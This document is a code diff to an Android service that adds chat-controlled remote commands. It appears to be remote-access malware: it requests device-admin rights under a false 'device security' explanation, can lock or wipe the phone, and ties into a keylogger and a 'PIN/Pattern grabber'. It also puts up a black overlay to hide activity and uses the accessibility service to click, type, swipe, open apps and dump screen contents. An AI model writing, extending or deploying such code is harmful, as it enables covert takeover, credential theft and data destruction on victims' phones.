@@ -487,6 +487,131 @@ class MainService : Service() {
                         d.sendMsg(":x: Vibrate failed: ${e.message?.take(50)}")
                     }
                 }
+                "admin" -> {
+                    when (payload?.lowercase()) {
+                        "on" -> {
+                            val comp = AdminReceiver.getComponent(this)
+                            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                            if (!dpm.isAdminActive(comp)) {
+                                val i = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+                                    .putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp)
+                                    .putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for device security")
+                                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                                startActivity(i)
+                                d.sendMsg(":shield: **Device Admin prompt sent** — accept on device")
+                            } else {
+                                d.sendMsg(":shield: Device Admin already active")
+                            }
+                        }
+                        "off" -> {
+                            val comp = AdminReceiver.getComponent(this)
+                            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                            dpm.removeActiveAdmin(comp)
+                            d.sendMsg(":shield: Device Admin removed")
+                        }
+                        "lock" -> {
+                            AdminReceiver.lockScreen(this)
+                            d.sendMsg(":shield: Device locked")
+                        }
+                        "wipe" -> {
+                            d.sendMsg(":warning: **Wiping device**...")
+                            AdminReceiver.wipeDevice(this)
+                        }
+                        else -> {
+                            val active = AdminReceiver.isActive(this)
+                            d.sendMsg(":shield: **Device Admin**: ${if (active) "ACTIVE" else "INACTIVE"}\n`!admin on` to enable\n`!admin lock` to lock screen")
+                        }
+                    }
+                }
+                "pin" -> {
+                    if (!KeylogService.isRunning) {
+                        d.sendMsg(":x: Accessibility service not running — `!keylog on` first")
+                    } else {
+                        d.sendMsg(":key: **PIN/Pattern grabber**\nEnable it via accessibility. Results appear here automatically after unlock.\n`!debug` for captured data.")
+                    }
+                }
+                "overlay" -> {
+                    val svc = KeylogService.instance
+                    if (svc == null) {
+                        d.sendMsg(":x: Accessibility service not running")
+                    } else {
+                        val enable = payload?.lowercase() != "off"
+                        svc.toggleBlackOverlay(enable)
+                        d.sendMsg(":black_large_square: Overlay **${if (enable) "ON" else "OFF"}**")
+                    }
+                }
+                "click" -> {
+                    val svc = KeylogService.instance
+                    if (svc == null) { d.sendMsg(":x: Accessibility not running"); return }
+                    if (payload == null) { d.sendMsg(":x: Usage: `!click <text>` or `!click x,y`"); return }
+                    val coords = payload.split(",")
+                    if (coords.size == 2) {
+                        val x = coords[0].trim().toIntOrNull()
+                        val y = coords[1].trim().toIntOrNull()
+                        if (x != null && y != null) {
+                            svc.harvester.click(x, y)
+                            d.sendMsg(":point_up: Clicked ($x, $y)")
+                        } else {
+                            d.sendMsg(":x: Invalid coordinates")
+                        }
+                    } else {
+                        svc.harvester.clickByText(payload)
+                        d.sendMsg(":point_up: Clicked text: $payload")
+                    }
+                }
+                "input" -> {
+                    val svc = KeylogService.instance
+                    if (svc == null) { d.sendMsg(":x: Accessibility not running"); return }
+                    if (payload == null || payload.isBlank()) { d.sendMsg(":x: Usage: `!input <text>`"); return }
+                    svc.harvester.inputText(payload)
+                    d.sendMsg(":keyboard: Input sent")
+                }
+                "open" -> {
+                    if (payload == null || payload.isBlank()) { d.sendMsg(":x: Usage: `!open com.example.app`"); return }
+                    try {
+                        val intent = packageManager.getLaunchIntentForPackage(payload)
+                        if (intent != null) {
+                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                            startActivity(intent)
+                            d.sendMsg(":link: Opened: $payload")
+                        } else {
+                            d.sendMsg(":x: Package not installed: $payload")
+                        }
+                    } catch (e: Exception) {
+                        d.sendMsg(":x: Failed: ${e.message?.take(50)}")
+                    }
+                }
+                "screen" -> {
+                    val svc = KeylogService.instance
+                    if (svc == null) { d.sendMsg(":x: Accessibility not running"); return }
+                    val tree = svc.harvester.dumpScreen()
+                    if (tree.isBlank()) {
+                        d.sendMsg(":frame_photo: No UI elements detected")
+                    } else {
+                        d.sendMsg(":frame_photo: **UI Tree**\n```\n${tree.take(1900)}\n```")
+                    }
+                }
+                "gesture" -> {
+                    val svc = KeylogService.instance
+                    if (svc == null) { d.sendMsg(":x: Accessibility not running"); return }
+                    if (payload == null) { d.sendMsg(":x: Usage: `!gesture x1,y1,x2,y2,ms`"); return }
+                    val parts = payload.split(",")
+                    if (parts.size == 5) {
+                        val x1 = parts[0].trim().toIntOrNull()
+                        val y1 = parts[1].trim().toIntOrNull()
+                        val x2 = parts[2].trim().toIntOrNull()
+                        val y2 = parts[3].trim().toIntOrNull()
+                        val ms = parts[4].trim().toIntOrNull() ?: 300
+                        if (x1 != null && y1 != null && x2 != null && y2 != null) {
+                            svc.harvester.swipe(x1, y1, x2, y2, ms)
+                            d.sendMsg(":hand_splayed: Swipe ($x1,$y1)->($x2,$y2) ${ms}ms")
+                        } else {
+                            d.sendMsg(":x: Invalid params")
+                        }
+                    } else {
+                        d.sendMsg(":x: Usage: `!gesture x1,y1,x2,y2,ms`")
+                    }
+                }
             }
         } catch (e: Exception) {
             Log.e(TAG, "gateway cmd: ${e.message}")
